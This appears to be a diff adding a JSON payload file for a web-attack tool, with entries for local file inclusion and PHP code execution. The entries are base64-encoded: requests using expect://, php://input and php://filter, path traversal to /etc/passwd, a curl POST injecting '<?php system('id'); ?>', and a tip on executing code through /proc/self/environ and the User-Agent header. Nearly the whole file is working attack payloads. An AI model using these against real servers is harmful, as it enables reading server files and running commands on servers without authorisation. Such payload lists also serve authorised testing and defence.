@@ -1,0 +1,36 @@
+{
+    "command": {
+        "php_expect": {
+            "description": "PHP Expect system command execution (likely disabled)",
+            "commands": [
+                "aHR0cDovLzEyNy4wLjAuMS9maWxlaW5jbC9leGFtcGxlMS5waHA/cGFnZT1leHBlY3Q6Ly9scw=="
+            ]
+        },
+        "lfi_generic": {
+            "description": "Generic LFI example",
+            "commands": [
+                "Zm9vLnBocD9maWxlPS4uLy4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2Q="
+            ]
+        },
+        "php_input_upload_post": {
+            "description": "Use the PHP input function to post/upload a file",
+            "commands": [
+                "Y3VybCAtWFBPU1QgImh0dHA6Ly9leGFtcGxlLmNvbS9pbmRleC5waHA/cGFnZT1waHA6Ly9pbnB1dCIgLS1kYXRhICI8P3BocCBzeXN0ZW0oJ2lkJyk7ID8+Ig=="
+            ]
+        },
+        "php_filter_lfi": {
+            "description": "PHP Filter module for LFI",
+            "commands": [
+                "aHR0cDovLzE5Mi4xNjguMTU1LjEzMS9maWxlaW5jbC9leGFtcGxlMS5waHA/cGFnZT1waHA6Ly9maWx0ZXIvY29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2Q="
+            ]
+        },
+        "php_proc_self_environ": {
+            "description": "Accessing /proc/self/environ to exec code",
+            "commands": [
+                "SWYgaXQZcyBwb3NzaWJsZSB0byBpbmNsdWRlIC9wcm9jL3NlbGYvZW52aXJvbiBmcm9tIHlvdXIgdnVsbmVyYWJsZSBMRkkgc2NyaXB0LCAKdGhlbiBjb2RlIGV4ZWN1dGlvbiBjYW4gYmUgbGV2ZXJhZ2VkIGJ5IG1hbmlwdWxhdGluZyB0aGUgVXNlciBBZ2VudCBwYXJhbWV0ZXIgd2l0aCBCdXJwLiAKQWZ0ZXIgdGhlIFBIUCBjb2RlIGhhcyBiZWVuIGludHJvZHVjZWQgL3Byb2Mvc2VsZi9lbnZpcm9uIGNhbiBiZSBleGVjdXRlZCB2aWEgeW91ciB2dWxuZXJhYmxlIExGSSBzY3JpcHQu"
+            ]
+        }
+    },
+    "configuration": {
+    }
+}
